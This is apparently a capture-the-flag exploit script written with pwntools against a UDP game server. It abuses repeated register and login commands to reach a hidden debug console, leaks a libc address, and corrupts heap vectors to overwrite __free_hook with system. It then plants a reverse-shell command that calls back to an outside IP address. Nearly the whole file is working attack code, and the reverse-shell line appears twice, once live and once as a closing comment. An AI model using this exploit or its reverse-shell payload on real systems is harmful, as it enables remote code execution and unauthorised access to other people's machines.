from pwn import *
context.log_level="debug"
env={
    "LD_PRELOAD":"./libc-2.27.so"
}
# p=process(["./server_game"],env=env)
sh=remote("94.74.101.210",49371,typ="udp")
# sh=remote("10.0.16.6",8080,typ="udp")

def sendcmd(cmd):
    sh.sendline(cmd)
    sleep(0.2)
sendcmd(b"register admin admin")
sendcmd(b"login admin admin")
sendcmd(b"purchase 100")
for i in range(5):
    sendcmd(b"register admin admin")
for i in range(5):
    sendcmd(b"login admin admin")
sendcmd(b"draw_000001")

for i in range(5):
    sendcmd(b"register admin admin")
for i in range(5):
    sendcmd(b"login admin admin")
sendcmd(b"draw_000001")

sendcmd(b"fight")
sh.recvuntil(b":\n")
sh.recvuntil(b"\n")

od=0

tmp=sh.recv(9)
if b"hero5" in tmp:
    od=2
tmp=sh.recv(8)
if b"hero5" in tmp:
    od=3

if od == 0:
    exit(0)

sendcmd(str(od).encode())
for i in range(5):
    sendcmd(b"attack")

sendcmd(b"fight")
sendcmd(str(od).encode())
sendcmd(b"attack")
sendcmd(b"Data_testing_console")

sh.sendlineafter(b"Enter function name: ",b'read')
sh.recvuntil(b"The address of read() is: ")
leak_read=int(sh.recv(14),16)
success("leak_read:"+hex(leak_read))
sh.sendlineafter(b"Enter the command: ",b"data_push")
# libc=ELF("/home/ubuntu/Tools/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so")
libc=ELF("./libc-2.27.so")
libcbase=leak_read-libc.sym['read']
libc.address=libcbase
freehook=libc.sym['__free_hook']
system=libc.sym['system']
success("freehook:"+hex(freehook))
success("libcbase:"+hex(libcbase))
# gdb.attach(p)
def cmd(c):
    sh.sendlineafter(b"Enter the operation: ",c)
def push(idx,value):
    cmd(b'push')
    sh.sendlineafter(b"Enter the vector number: ",str(idx).encode())
    sh.sendlineafter(b" value:",str(value).encode())
def grow(idx,size):
    cmd(b'grow')
    sh.sendlineafter(b"Enter the vector number: ",str(idx).encode())
    sh.sendlineafter(b"Enter the grow value: ",str(size).encode())

for i in range(256):
    push(1,3)
push(1,3)
grow(1,0x200)
for i in range(255):
    push(1,3)

grow(2,0x200)
push(1,3)

for i in range(8):
    push(2,p64(freehook)[i])


grow(3,0x200)

for i in range(8):
    push(4,p64(system)[i])
grow(4,0x200)

for i in range(56):
    push(5,b'bash -c "bash -i >& /dev/tcp/101.43.140.240/23946 0>&1"\x00'[i])
grow(5,0x200)

cmd(b'quit')
# gdb.attach(p)



# draw_011214
# Data_testing_console
sh.interactive()
# bash -c "bash -i >& /dev/tcp/101.43.140.240/23946 0>&1"